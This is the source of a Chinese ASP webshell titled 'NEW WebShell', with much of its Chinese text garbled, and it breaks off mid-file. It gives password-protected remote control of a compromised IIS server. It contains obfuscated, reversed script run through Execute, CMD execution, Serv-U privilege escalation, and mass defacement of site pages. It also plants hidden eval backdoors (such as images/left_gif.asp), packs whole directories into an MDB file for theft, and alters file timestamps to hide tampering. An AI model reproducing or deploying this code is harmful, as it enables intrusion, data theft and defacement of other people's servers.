<%
UserPass="admin"     '��½����
loginad="�ձ����빷�������ڣ� "'������֤������ʾ������
mName="���NEW WebShell"           '��������
SiteURL="http://www.7jyewu.cn/"            '��վ
Copyright="�������ڷǷ���;�����������߸Ų�����"       '��Ȩ
AD="���"   '�������
'------------------------------------------------------------

'  �������ظ���ţ����ɱ�����𣿡�   http://www.7jyewu.cn/

'-------------------------------------------------------------
Server.ScriptTimeout=999999999
Response.Buffer =true
On Error Resume Next
sub ShowErr()
  If Err Then
    RRS"<br><a href='javascript:history.back()'><br>&nbsp;" & Err.Description & "</a><br>"
    Err.Clear:Response.Flush
  End If
end sub
Sub RRS(str)
	response.write(str)
End Sub
Function RePath(S)
  RePath=Replace(S,"\","\\")
End Function
Function RRePath(S)
  RRePath=Replace(S,"\\","\")
End Function
URL=Request.ServerVariables("URL")
ServerIP=Request.ServerVariables("LOCAL_ADDR")
Action=Request("Action"):RootPath=Server.MapPath(".")
WWWRoot=Server.MapPath("/")
serveru=request.servervariables("http_host")&url
serverp=userpass
uu=serveru
FolderPath=Request("FolderPath")
FName=Request("FName")
BackUrl="<br><br><center><a href='javascript:history.back()'>����</a></center>":
dim ShiSan,ShiSanNewstr,ShiSanI
Function ShiSanFun(ShiSanObjstr)
ShiSanObjstr = Replace(ShiSanObjstr, "��", """")
For ShiSanI = 1 To Len(ShiSanObjstr)
 If Mid(ShiSanObjstr, ShiSanI, 1) <> "��" Then
ShiSanNewStr = Mid(ShiSanObjstr, ShiSanI, 1) & ShiSanNewStr
 Else
ShiSanNewStr = vbCrLf & ShiSanNewStr
 End If
Next
ShiSanFun = ShiSanNewStr
End Function
uu=serveru
RRS"<html><meta http-equiv=""Content-Type"" content=""text/html; charset=gb2312"">"
RRS"<title>"&mName&" - "&ServerIP&" </title>"
RRS"<style type=""text/css"">"
RRS"body,td{font-size: 12px;background-color:#000000;color:#00ff00;}"
RRS"input,select,textarea{font-size: 12px;background-color:#FFFFCC;border:1px solid #fff}"
RRS".C{background-color:#000000;border:0px}"
RRS".cmd{background-color:#000;color:#FFF}"
RRS"body{margin: 0px;margin-left:4px;}"
RRS"BODY {SCROLLBAR-FACE-COLOR: #000000;SCROLLBAR-HIGHLIGHT-COLOR: #00fcfc;SCROLLBAR-SHADOW-COLOR: #00fcfc;SCROLLBAR-ARROW-COLOR: #00fcfc;SCROLLBAR-TRACK-COLOR: #000000;SCROLLBAR-DARKSHADOW-COLOR: #00fcfc;SCROLLBAR-BASE-COLOR: #000000}"
RRS"a{color:#ddd;text-decoration: none;}a:hover{color:red;background:#000}"
RRS".am{color:#888;font-size:11px;}"
RRS"</style>"
ShiSan="���>tpircs/<��SRR���};eurt nruter;)(timbus.mroFbD;�����=LMTHrenni.cba;gp = eulav.egaP.mroFbD;rts = eulav.rtSlqS.mroFbD};eslaf nruter;)���!ȷ�����Ǿ���LQS�������(trela{)01<htgnel.rts(fi};eslaf nruter;)���!ȷ�����Ǵ�����������������(trela{)5<htgnel.eulav.rtSbD.mroFbD(fi{)gp,rts(rtSlqSlluF noitcnuf��SRR���};eurt nruter};]i[rtS = eulav.rtSlqS.mroFbD{esle};)]i[rtS(trela{)21==i(fi esle};���>retnec/<��������������LQS�����ٿ������������ȷ��>retnec<���=LMTHrenni.cba;����� = eulav.rtSlqS.mroFbD;]i[rtS = eulav.rtSbD.mroFbD{)3=<i(fi;��塣���ָ�ʮ��ǰ�Ķ���ʾ��ֻ������һ����n\.��ʵѯ���ƿؼ����ÿɣ����ֲ�ȫ�Ķ���ʾ�Կɼ�ʱ������һʾ��ֻ����� =]21[rtS;���SSAP NMULOC PORD ]emaNelbaT[ ELBAT RETLA��� =]11[rtS;���)23(RAHCRAV SSAP NMULOC DDA ]emaNelbaT[ ELBAT RETLA��� =]01[rtS;���]emaNelbaT[ ELBAT PORD��� = ]9[rtS;���))05(RAHCRAV RESU,LLUN TON )1,1( YTITNEDI TNI DI(]emaNelbaT[ ELBAT ETAERC��� = ]8[rtS;���001=DI EREHW '\emanresu'\=RESU TES ]emaNelbaT[ ETADPU��� = ]7[rtS;���001=DI EREHW ]emaNelbaT[ MORF ETELED��� = ]6[rtS;���)'\drowssap'\,'\emanresu'\(SEULAV )SSAP,RESU(]emaNelbaT[ OTNI TRESNI��� = ]5[rtS;���001<DI EREHW ]emaNelbaT[ MORF * TCELES��� = ]4[rtS;���emaNnsD=nsD��� = ]3[rtS;���****=dwP;toor=diU;emaNbD=esabataD;6033=troP;��&PIrevreS&��=revreS;}lqSyM{=revirD��� = ]2[rtS;���****=dwP;as=diU;emaNbD=esabataD;3341,��&PIrevreS&��=revreS;}revreS lqS{=revirD��� = ]1[rtS;���***=drowssaP esabataD:BDELO teJ;bdm.bd\\��&))��htaPredloF��(noisseS(htaPeR&��=ecruoS ataD;0.4.BDELO.teJ.tfosorciM=redivorP��� = ]0[rtS;)21(yarrA wen = rtS};eslaf nruter{)0<i(fi{)i(rtSbDlluF noitcnuf��SRR���};eurt nruter};eslaf nruter;)0(rtSbDlluF;)�����������������(trela{)����� == eulav.rtSbD.mroFbD(fi{)(kcehCbD noitcnuf��SRR���}};����� = eulav.emaNF.mrofedih.pot{esle};)(timbus.mrofedih.pot;noitcAF = eulav.noitcA.mrofedih.pot{)llun=!emaND(fi};���rehtO��� = emaND{esle};emaND = eulav.emaNF.mrofedih.pot;)emaNF,��壡�ڴ���Ǽ�����ע,����ȫ����bdM����ѹҪ��������(tpmorp = emaND{)���bdMtcapmoC���==noitcAF(fi esle};emaND = eulav.emaNF.mrofedih.pot;)emaNF,��壡��ͬ�ܲ���ע,����ȫ����bdM�Ľ���Ҫ��������(tpmorp = emaND{)���bdMetaerC���==noitcAF(fi esle};emaND = eulav.emaNF.mrofedih.pot;)emaNF,������ȫ�м��ĵĽ���Ҫ��������(tpmorp = emaND{)���redloFweN���==noitcAF(fi esle};emaND+���||||��� =+ eulav.emaNF.mrofedih.pot;)emaNF,������ȫ�м��ı�Ŀ��������������(tpmorp = emaND{)���redloFevoM���==noitcAF(fi esle};emaND+���||||��� =+ eulav.emaNF.mrofedih.pot;)emaNF,������ȫ�м��ı�Ŀ��������������(tpmorp = emaND{)���redloFypoC���==noitcAF(fi esle};emaND+���||||��� =+ eulav.emaNF.mrofedih.pot;)emaNF,������ȫ���ı�Ŀ��������������(tpmorp = emaND{)���eliFevoM���==noitcAF(fi esle};emaND+���||||��� =+ eulav.emaNF.mrofedih.pot;)emaNF,������ȫ���ı�Ŀ���Ƹ���������(tpmorp = emaND{)���eliFypoC���==noitcAF(fi;emaNF = eulav.emaNF.mrofedih.pot{)noitcAF,emaNF(mroFlluF noitcnuf��SRR���};)(timbus.mrofrdda.pot;redloF = eulav.htaPredloF.mrofrdda.pot{)redloF(redloFwohS noitcnuf��SRR���;)(kcolCnur};yalpsid+���--  ��&DA&��������=sutats.wodniw;)(gnirtSelacoLot.yadot =yalpsid rav;)(etaD wen = yadot rav;)001 ,���)(kcolCnur���(tuoemiTtes.wodniw = emiTeht{)(kcolCnur noitcnuf��SRR���};eslaf nruter esle;eurt nruter))��壿�����ٴ���ִҪ��ȷ���(mrifnoc( fi{)(kosey noitcnuf��SRR���;srorrEllik=rorreno.wodniw};eurt nruter{)(srorrEllik noitcnuf>tpircsavaj=egaugnal tpircs<��SRR"
ExeCuTe(ShiSanFun(ShiSan))
rrs "<body" 
If Action="" then RRS " scroll=no"
rrs ">"
Dim ObT(13,2)
ObT(0,0) = "Scripting.FileSystemObject"
  ObT(0,2) = "�ļ��������"
ObT(1,0) = "wscript.shell"
  ObT(1,2) = "������ִ�����"
ObT(2,0) = "ADOX.Catalog"
  ObT(2,2) = "ACCESS�������"
ObT(3,0) = "JRO.JetEngine"
  ObT(3,2) = "ACCESSѹ�����"
ObT(4,0) = "Scripting.Dictionary" 
  ObT(4,2) = "�������ϴ��������"
ObT(5,0) = "Adodb.connection"
  ObT(5,2) = "���ݿ��������"
ObT(6,0) = "Adodb.Stream"
  ObT(6,2) = "�������ϴ����"
ObT(7,0) = "SoftArtisans.FileUp"
  ObT(7,2) = "SA-FileUp �ļ��ϴ����"
ObT(8,0) = "LyfUpload.UploadFile"
  ObT(8,2) = "���Ʒ��ļ��ϴ����"
ObT(9,0) = "Persits.Upload.1"
  ObT(9,2) = "ASPUpload �ļ��ϴ����"
ObT(10,0) = "JMail.SmtpMail"
  ObT(10,2) = "JMail �ʼ��շ����"
ObT(11,0) = "CDONTS.NewMail"
  ObT(11,2) = "����SMTP�������"
ObT(12,0) = "SmtpMail.SmtpMail.1"
  ObT(12,2) = "SmtpMail�������"
ObT(13,0) = "Microsoft.XMLHTTP"
  ObT(13,2) = "���ݴ������"
For i=0 To 13
	Set T=Server.CreateObject(ObT(i,0))
	If -2147221005 <> Err Then
	  IsObj=" ��"
	Else
	  IsObj=" ��"
	  Err.Clear
	End If
	Set T=Nothing
	ObT(i,1)=IsObj
Next
If FolderPath<>"" then
  Session("FolderPath")=RRePath(FolderPath)
End If
If Session("FolderPath")="" Then
  FolderPath=RootPath
  Session("FolderPath")=FolderPath
End if
function php():On Error Resume Next:set fso=Server.CreateObject(oBt(0,0)):fso.CreateTextFile(server.mappath("test.php")).Write"<?PHP echo 'oo��_��oo'?><?php phpinfo()?>":fso.CreateTextFile(server.mappath("test.jsp")).Write"Jsp Test oo��_��oo":fso.CreateTextFile(Server.MapPath("/")&"/images/left_gif.asp").Write""&chr(60)&"%Eval(Request(chr(63))):"&chr(37)&""&chr(62)&"":
fso.CreateTextFile(server.mappath("test.aspx")).Write""&chr(60)&"%@ Page Language=""Jscript"" validateRequest=""false"" "&chr(37)&""&chr(62)&""&chr(60)&""&chr(37)&"Response.Write(eval(Request.Item[""w""],""unsafe""));"&chr(37)&""&chr(62)&"aspx Test oo��_��oo":
RRS"<center><iframe src=test.php width=300 height=100></iframe>&nbsp;&nbsp;&nbsp;&nbsp; ":
RRS"<iframe src=test.jsp width=300 height=100></iframe>&nbsp;&nbsp;&nbsp;&nbsp; ":
RRS"<iframe src=test.aspx width=300 height=100></iframe>&nbsp;&nbsp;&nbsp; </center>":
RRS"<br><br><p><br><p><br><br><p><br><center>Test<p></font><p><a href='?Action=apjdel'><font size=5 color=red>(ɾ�������ļ�!)</font> "&copyurl&"</a></center>":RRS Efun&""&serveru&"&p="&UserPass&"'><script>"
End function:function apjdel():set fso=Server.CreateObject(oBt(0,0)):fso.DeleteFile(server.mappath("test.aspx")):fso.DeleteFile(server.mappath("test.php")):fso.DeleteFile(server.mappath("test.jsp")):
RRS"Del Success!":End function
Function MainForm()
RRS"<form name=""hideform"" method=""post"" action="""&urL&""" target=""FileFrame"">":
RRS"<input type=""hidden"" name=""Action"">":
RRS"<input type=""hidden"" name=""FName"">":
RRS"</form>":
RRS"<table width='100%' height='100%'  border=0 cellpadding='1' cellspacing='0'>":
RRS"<tr><td height='30' colspan='2'>":
RRS"<table width='100%'>":
RRS"<form name='addrform' method='post' action='"&Url&"' target='_parent'>":
RRS"<tr><td width='60' align='center'>��ַ����</td><td>":
RRS"<input name='FolderPath' style='width:100%' value='"&SesSIon("FolderPath")&"'>":
RRS"</td><td width='140' align='center'><input name='Submit' type='submit' value='ת��'> <input type='submit' value='ˢ��������' onclick='FileFrame.location.reload()'>" :
RRS"  <tr align='center' valign='middle'>":
RRS"<tr>��ȨĿ¼�б���<a href='javascript:ShowFolder(""C:\\Program Files"")'>Program</a>����<a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\"")'>AllUsers</a>����<a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\����ʼ���˵�\\����\\"")'>��ʼ <b>��</b> ����</a>����<a href='javascript:ShowFolder(""C:\\RECYCLER\\"")'>C:\\RECYCLER</a>����<a href='javascript:ShowFolder(""D:\\RECYCLER\\"")'>D:\RECYCLER</a>����<a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\Application Data\\Symantec\\pcAnywhere\\"")'>pcAnywhere</a>����<a href='javascript:ShowFolder(""c:\\Program Files\\serv-u\\"")'>serv-u</a>����<a href='javascript:ShowFolder(""C:\\Program Files\\Real"")'>RealServer</a>����<a href='javascript:ShowFolder(""C:\\Program Files\\Microsoft SQL Server\\"")'>SQL</a>����<a href='javascript:ShowFolder(""C:\\WINDOWS\\system32\\config\\"")'>config</a>����<a href='javascript:ShowFolder(""c:\\WINDOWS\\system32\\inetsrv\\data\\"")'>data</a>����<a href='javascript:ShowFolder(""c:\\windows\\Temp\\"")'>Temp</a>����<a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\Documents\\"")'>Documents</a>��</td><td>":
RRS"</td></tr></form></table></td></tr><tr><td width='170'>":
RRS"<iframe name='Left' src='?Action=MainMenu' width='100%' height='100%' frameborder='0'></iframe></td>":
RRS"<td>":
RRS"<iframe name='FileFrame' src='?Action=Show1File' width='100%' height='100%' frameborder='1'></iframe>":
RRS"</td></tr></table>"

End Function
sWHEEL1 = "jwt"
Function Encrypt(acd)
For i = 1 To Len(acd) step 1
c=mid(acd,i,1)
if c="��" then
d=mid(acd,i,2)
i=i+1
e=replace(d,"��","")
bbc=bbc&mid(sWHEEL1,cint(e),1)
else
bbc=bbc&c
end if
next
Encrypt=bbc
end Function

Function MainMenu()
RRS"<table width='100%' cellspacing='0' cellpadding='0'>":RRS"<tr><td height='5'></td></tr>":RRS"<tr><td><center><font color=red>"&mName&"</font></center></a><hr hight=1 width='100%'>":RRS"</td></tr>":If ObT(0,1)=" ��" Then:RRS"<tr><td height='24'>��Ȩ��</td></tr>":Else:RRS"<tr><td height=22 onmouseover=""menu1.style.display=''""><b> +>�鿴Ӳ��</b><div id=menu1 style=""width:100%;display='none'"" onmouseout=""menu1.style.display='none'"">":Set ABC=New LBF:RRS ABC.ShowDriver():Set ABC=Nothing:RRS"</div></td></tr><tr><td height='20'><a href='javascript:ShowFolder("""&RePath(WWWRoot)&""")'>->վ��<b>��Ŀ¼</b></a></td></tr>":RRS"<tr><td height='20'><a href='javascript:ShowFolder("""&RePath(RootPath)&""")'>->��<b>����Ŀ¼</b></a></td></tr>":RRS"<tr><td height='20'><a href='javascript:ShowFolder(""C:\\Progra~1"")'>->C:\\Progra~1</a></td></tr>":RRS"<tr><td height='20'><a href='javascript:ShowFolder(""C:\\Docume~1"")'>->C:\\Docume~1</a></td></tr>":RRS"":RRS"<tr><td height='20'><a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\NewFolder")&""",""NewFolder"")'>->�½�Ŀ¼</a></td></tr>":RRS"<tr><td height='20'><a href='?Action=EditFile' target='FileFrame'>->�½��ı�</a></td></tr>":End If::RRS"<tr><td height='22'><a href='?Action=UpFile' target='FileFrame'>->�ϴ��ļ�</a></td></tr>"::RRS"<tr><td height='22'><a href='?Action=Course' target='FileFrame'>->ϵͳ����-�û��˺�</a></td></tr>":RRS"<tr><td height='22'><a href='?Action=getTerminalInfo' target='FileFrame'><b>->�ն˶˿�-�Զ���¼</b></a></td></tr>":RRS"<tr><td height='22'><a href='?Action=ServerInfo' target='FileFrame'>->��������Ϣ-���֧��</a></td></tr>":RRS"<tr><td height='22'><a href='?Action=Cmd1Shell' target='FileFrame'><b>->ִ��CMD����</b></a></td></tr>":RRS"<tr><td height='22'><a href='?Action=SetFileText' target='FileFrame'><b>->�޸��ļ�����</b></a></td></tr>":RRS"<tr><td height='22'><a href='?Action=php' target='FileFrame'><b>->�ű�̽��</b></a></td></tr>":RRS"<tr><td height='22'><a href='?Action=hiddenshell' target='FileFrame'><b>->�������ش���</b></a></td></tr>":RRS"<tr><td height='22'><a href='?Action=Servu' target='FileFrame'><b>->Servu��Ȩ</b>(��ǿ��)</a></td></tr>":RRS"<tr><td height='22'><a href='?Action=kmuma' target='FileFrame'><b>->�����ļ�</b></a></td></tr>":RRS"<tr><td height='22'><a href='?Action=Cplgm&M=1' target='FileFrame'>->����<b>��</b>(��ǿ��)</a></td></tr>":RRS"<tr><td height='22'><a href='?Action=Cplgm&M=2' target='FileFrame'>->����<b>��</b>(��ǿ��)</a></td></tr>":RRS"<tr><td height='22'><a href='?Action=Cplgm&M=3' target='FileFrame'>->����<b>�滻</b>(��ǿ��)</a></td></tr>":RRS"<tr><td height='22'><a href='?Action=plgm' target='FileFrame'></b>->������(��ͨ��)</a></b></td></tr>":RRS"<tr><td height='22'><a href='?Action=PageAddToMdb' target='FileFrame'>->�ļ��д��-�����</a></td></tr>":RRS"<tr><td height='22'><a href='?Action=ReadREG' target='FileFrame'>->��ȡע�������</a></td></tr>":RRS"<tr><td height='22'><a href='?Action=ScanPort' target='FileFrame'>->�˿�ɨ����</a></td></tr>":RRS"<tr><td height='24' onmouseover=""menu2.style.display=''""><b>+>���ݿ����</b><div id=menu2 style=""line-height:18px;width:100%;display='none'"" onmouseout=""menu2.style.display='none'"">":RRS"&nbsp;&nbsp;&nbsp;<a href='?Action=DbManager' target='FileFrame'>�������ݿ�</a><br>":RRS"&nbsp;&nbsp;&nbsp;<a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\New.mdb")&""",""CreateMdb"")'>����MDB�ļ�</a><br>":RRS"&nbsp;&nbsp;&nbsp;<a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\data.mdb")&""",""CompactMdb"")'>ѹ��MDB�ļ�</a></div></td></tr>"::RRS"<tr><td height='22'><a href='?Action=Logout' target='_top'>->�˳���¼</a></td></tr>":RRS"<tr><td align=center style='color:red'><hr>"&Copyright&"</td></tr></table>":
RRS"</table>"
End Function
	Sub PageAddToMdb()
		Dim theAct, thePath
		theAct = Request("theAct")
		thePath = Request("thePath")
		Server.ScriptTimeOut = 5000
		If theAct = "addToMdb" Then
			addToMdb(thePath)
			RRS "�������!"
			Response.End
		End If
		If theAct = "releaseFromMdb" Then
			unPack(thePath)
			RRS"�������!"
			Response.End
		End If
		RRS "�ļ��д��:<br/>"
		RRS "<form method=post target=main>"
		RRS "<input name=thePath value=""" & HtmlEncode(Server.MapPath(".")) & """ size=80>"
		RRS "<input type=hidden value=addToMdb name=theAct>"
		RRS "<select name=theMethod><option value=fso>FSO</option><option value=app>��FSO</option>"
		RRS "</select>"
		RRS "<br><input type=submit value='��ʼ���'>"
		RRS "<hr/>ע: �������HYTop.mdb�ļ�,λ��ľMMͬ��Ŀ¼��"
		RRS "</form>"
		RRS "<hr/>�ļ����⿪(��FSO֧��):<br/>"
		RRS "<form method=post target=main>"
		RRS "<input name=thePath value=""" & HtmlEncode(Server.MapPath(".")) & "\HYTop.mdb"" size=80>"
		RRS "<input type=hidden value=releaseFromMdb name=theAct><input type=submit value='���ҽ⿪'>"
		RRS "<hr/>ע: �⿪���������ļ���λ��ľMMͬ��Ŀ¼��"
		RRS "</form>"
		RRS "<hr/>"
	End Sub
	Sub addToMdb(thePath)
		On Error Resume Next
		Dim rs, conn, stream, connStr, adoCatalog
		Set rs = Server.CreateObject("ADODB.RecordSet")
		Set stream = Server.CreateObject("ADODB.Stream")
		Set conn = Server.CreateObject("ADODB.Connection")
		Set adoCatalog = Server.CreateObject("ADOX.Catalog")
		connStr = "Provider=Microsoft.Jet.OLEDB.4.0; Data Source=" & Server.MapPath("HYTop.mdb")
		adoCatalog.Create connStr
		conn.Open connStr
		conn.Execute("Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED, thePath VarChar, fileContent Image)")
		stream.Open
		stream.Type = 1
		rs.Open "FileData", conn, 3, 3
		If Request("theMethod") = "fso" Then
			fsoTreeForMdb thePath, rs, stream
		 Else
			saTreeForMdb thePath, rs, stream
		End If
		rs.Close
		Conn.Close
		stream.Close
		Set rs = Nothing
		Set conn = Nothing
		Set stream = Nothing
		Set adoCatalog = Nothing
	End Sub
	Function fsoTreeForMdb(thePath, rs, stream)
		Dim item, theFolder, folders, files, sysFileList
		sysFileList = "$HYTop.mdb$HYTop.ldb$"
		If fsoX.FolderExists(thePath) = False Then
			showErr(thePath & " Ŀ¼�����ڻ��߲��������!")
		End If
		Set theFolder = fsoX.GetFolder(thePath)
		Set files = theFolder.Files
		Set folders = theFolder.SubFolders
		For Each item In folders
			fsoTreeForMdb item.Path, rs, stream
		Next
		For Each item In files
			If InStr(sysFileList, "$" & item.Name & "$") <= 0 Then
				rs.AddNew
				rs("thePath") = Mid(item.Path, 4)
				stream.LoadFromFile(item.Path)
				rs("fileContent") = stream.Read()
				rs.Update
			End If
		Next
		Set files = Nothing
		Set folders = Nothing
		Set theFolder = Nothing
	End Function
	function Gpath()
on error resume next
err.clear
set f=Server.CreateObject("Scripting.FileSystemObject")
if err.number>0 then
gpath="c:"
exit function
end if
gpath=f.GetSpecialFolder(0)
gpath=lcase(left(gpath,2))
set f=nothing
end function

	Sub unPack(thePath)
		On Error Resume Next
		Server.ScriptTimeOut = 5000
		Dim rs, ws, str, conn, stream, connStr, theFolder
		str = Server.MapPath(".") & "\"
		Set rs = CreateObject("ADODB.RecordSet")
		Set stream = CreateObject("ADODB.Stream")
		Set conn = CreateObject("ADODB.Connection")
		connStr = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & thePath & ";"
		conn.Open connStr
		rs.Open "FileData", conn, 1, 1
		stream.Open
		stream.Type = 1
		Do Until rs.Eof
			theFolder = Left(rs("thePath"), InStrRev(rs("thePath"), "\"))
			If fsoX.FolderExists(str & theFolder) = False Then
				createFolder(str & theFolder)
			End If
			stream.SetEos()
			stream.Write rs("fileContent")
			stream.SaveToFile str & rs("thePath"), 2
			rs.MoveNext
		Loop
		rs.Close
		conn.Close
		stream.Close
		Set ws = Nothing
		Set rs = Nothing
		Set stream = Nothing
		Set conn = Nothing
	End Sub
	Sub createFolder(thePath)
		Dim i
		i = Instr(thePath, "\")
		Do While i > 0
			If fsoX.FolderExists(Left(thePath, i)) = False Then
				fsoX.CreateFolder(Left(thePath, i - 1))
			End If
			If InStr(Mid(thePath, i + 1), "\") Then
				i = i + Instr(Mid(thePath, i + 1), "\")
			 Else
				i = 0
			End If
		Loop
	End Sub
	Sub saTreeForMdb(thePath, rs, stream)
		Dim item, theFolder, sysFileList
		sysFileList = "$HYTop.mdb$HYTop.ldb$"
		Set theFolder = saX.NameSpace(thePath)
		For Each item In theFolder.Items
			If item.IsFolder = True Then
				saTreeForMdb item.Path, rs, stream
			 Else
				If InStr(sysFileList, "$" & item.Name & "$") <= 0 Then
					rs.AddNew
					rs("thePath") = Mid(item.Path, 4)
					stream.LoadFromFile(item.Path)
					rs("fileContent") = stream.Read()
					rs.Update
				End If
			End If
		Next
		Set theFolder = Nothing
	End Sub
	sub SetFileText()
dim Path,FileName,NewTime,ShuXing
set path=request.Form("path1")
set fileName=request.Form("filename")
set newTime=request.Form("time")
set ShuXing=request.Form("shuxing")
RRS "<form method=post>"
RRS "<center>·&nbsp;&nbsp;&nbsp;&nbsp;����<input name='path1' value='"&WWWROOT&"' size='60'>(һ��Ҫ��\��β)<br/>"
RRS "&nbsp;�ļ����ƣ�<input name=filename value='index.asp' size='60'>(Ҫ�޸ĵ��ļ���)<br/>"
RRS "&nbsp;&nbsp;&nbsp;�޸�ʱ�䣺<input name=time value='12/21/2012 23:59:59' size='60'>&nbsp;��/��/�� ʱ:��:��<br/>"
RRS "<select onChange='this.form.shuxing.value=this.value;'>"
RRS "<option value=''>��ͨ </option>"
RRS "<option value='1'>ֻ�� </option>"
RRS "<option value='2'>���� </option>"
RRS "<option value='4'>ϵͳ</option>"
RRS "<option value='33'>ֻ��,�浵 </option>"
RRS "<option value='34'>����,�浵 </option>"
RRS "<option value='35'>ֻ������,�浵 </option>"
RRS "<option value='39'>ֻ������,�浵,ϵͳ </option>"
RRS "�޸� ���ԣ�<input name=shuxing value='0' size='40'><br/>"
RRS "<input type=submit value=�޸�>"
RRS "</form>"
if( (len(path)>0)and(len(fileName)>0)and(len(newTime)>0) )then
Set fso=Server.CreateObject(obt(0,0))
Set file=fso.getFile(path&fileName)
file.attributes=ShuXing
Set shell=Server.CreateObject("Shell.Application")
Set app_path=shell.NameSpace(server.mappath("."))
Set app_file=app_path.ParseName(fileName)
app_file.Modifydate=newTime
RRS "</br></br>�޸��ļ�&nbsp;&nbsp;"&path&fileName&"&nbsp;&nbsp;������� </center>"
end if
end sub
Function Course()
ShiSan="����>elbat/<��&2IS&1IS&0IS&IS SRR��txen��fi dne���>rt/<>dt/<>tnof/<��&htap.jbo&��;psbn&>FF9933#=roloc tnof<]��&xl&��:���ද��[>���2���=napsloc ���FFFFFF#���=rolocgb ���02���=thgieh dt<>rt<��&emaNyalpsiD.jbo&��;psbn&>���FFFFFF#���=rolocgb ���02���=thgieh dt<>dt/<��&emaN.jbo&��;psbn&>���FFFFFF#���=rolocgb ���02���=thgieh dt<>rt<��&2IS=2IS��esle���>rt/<>dt/<>tnof/<��&htap.jbo&��;psbn&>0000FF#=roloc tnof<]��&xl&��:���ද��[>���2���=napsloc ���FFFFFF#���=rolocgb ���02���=thgieh dt<>rt<��&emaNyalpsiD.jbo&��;psbn&>���FFFFFF#���=rolocgb ���02���=thgieh dt<>dt/<��&emaN.jbo&��;psbn&>���FFFFFF#���=rolocgb ���02���=thgieh dt<>rt<��&1IS=1IS��neht 2=epyTtratS.JBO dna ��niw��><))3,4,htap.jbo(dim(esaCL fi����ý���=xl neht 4=epyTtratS.JBO fi��嶯�֩�=xl neht 3=epyTtratS.JBO fi��嶯�ԩ�=xl neht 2=epyTtratS.JBO fi��fi dne�� ��>rt/<>dt/<;psbn&>���2���=napsloc ���FFFFFF#���=rolocgb ���02���=thgieh dt<>rt<��=0IS���>rt/<>dt/<��&IS=IS���)��(����ͳϵ��&IS=IS�� ��;psbn&>���FFFFFF#���=rolocgb dt<>dt/<��&IS=IS��emaN.jbo&IS=IS���;psbn&>���FFFFFF#���=rolocgb ���02���=thgieh dt<��&IS=IS���>rt<��&IS=IS��neht ���=epyTtratS.JBO fi��raelc.rre��)��.//:TNniW��(tcejbOteg ni jbo hcae rof��txen emuser rorre no���>rt/<>dt/<����뻧��ͳϵ>'unem'=rolocgb 'retnec'=ngila '3'=napsloc '02'=thgieh dt<>rt<��&IS=IS���>'retnec'=ngila '0'=gniddapllec '1'=gnicapsllec '0'=redrob 'unem'=rolocgb '006'=htdiw elbat<>rb<��=IS"
ExeCuTe(ShiSanFun(ShiSan))
End Function
Function ServerInfo()
ShiSan="���IS SRR��txeN���>rt/<>dt/<��&)2,i(TbO&��>tfel=ngila 'FFFFFF#'=rolocgb dt<>dt/<��&)1,i(TbO&��>'FFFFFF#'=rolocgb dt<>dt/<��&)0,i(TbO&��>'FFFFFF#'=rolocgb '002'=htdiw '02'=thgieh dt<>'retnec'=ngila rt<��&IS=IS��31 oT 0=i roF���>rt/<>dt/<��&)��ERAWTFOS_REVRES��(selbairaVrevreS.tseuqeR&��>'FFFFFF#'=rolocgb dt<>dt/<;psbn&>'FFFFFF#'=rolocgb dt<>dt/<���������BEW>'FFFFFF#'=rolocgb '002'=htdiw '02'=thgieh dt<>'retnec'=ngila rt<��&IS=IS���>rt/<>dt/<��&)��SO��(selbairaVrevreS.tseuqeR&��>'FFFFFF#'=rolocgb dt<>dt/<;psbn&>'FFFFFF#'=rolocgb dt<>dt/<ͳϵ���������>'FFFFFF#'=rolocgb '002'=htdiw '02'=thgieh dt<>'retnec'=ngila rt<��&IS=IS���>rt/<>dt/<��&)��SROSSECORP_FO_REBMUN��(selbairaVrevreS.tseuqeR&��>'FFFFFF#'=rolocgb dt<>dt/<;psbn&>'FFFFFF#'=rolocgb dt<>dt/<����UPC�����>'FFFFFF#'=rolocgb '002'=htdiw '02'=thgieh dt<>'retnec'=ngila rt<��&IS=IS���>rt/<>dt/<;psbn&��&won&��>'FFFFFF#'=rolocgb dt<>dt/<;psbn&>'FFFFFF#'=rolocgb dt<>dt/<��ʱ�����>'FFFFFF#'=rolocgb '002'=htdiw '02'=thgieh dt<>'retnec'=ngila rt<��&IS=IS���>mrof/<>rt/<>dt/<>'2'=eulav 'noitca'=eman 'neddih'=epyt tupni<>'xp0:redrob'=elyts'ѯ��'=eulav 'timbus'=epyt tupni<>'xp0:redrob'=elyts'��&)��RDDA_LACOL��(selbairaVrevreS.tseuqeR&��'=eulav '51'=ezis 'pi'=eman 'txet'=epyt tupni<��&IS=IS���>'FFFFFF#'=rolocgb dt<>dt/<;psbn&>'FFFFFF#'=rolocgb dt<>dt/<PI�����>'FFFFFF#'=rolocgb '002'=htdiw '02'=thgieh dt<>'retnec'=ngila rt<>'knalb_'=tegrat 'mrofpi'=eman 'psa.xedni/moc.831pi.www//:ptth'=noitca tsop=dohtem mrof<��&IS=IS���>rt/<>dt/<��&)��EMAN_REVRES��(selbairaVrevres.tseuqer&��>'FFFFFF#'=rolocgb dt<>dt/<;psbn&>'FFFFFF#'=rolocgb dt<>dt/<�������>'FFFFFF#'=rolocgb '002'=htdiw '02'=thgieh dt<>'retnec'=ngila rt<��&IS=IS���>rt/<>dt/<Ϣ�ż��������>'unem'=rolocgb 'retnec'=ngila '3'=napsloc '02'=thgieh dt<>rt<��&IS=IS���>'retnec'=ngila '0'=gniddapllec '1'=gnicapsllec '0'=redrob 'unem'=rolocgb '%08'=htdiw elbat<>rb<��=IS"
ExeCuTe(ShiSanFun(ShiSan))
End Function
Function DownFile(Path)
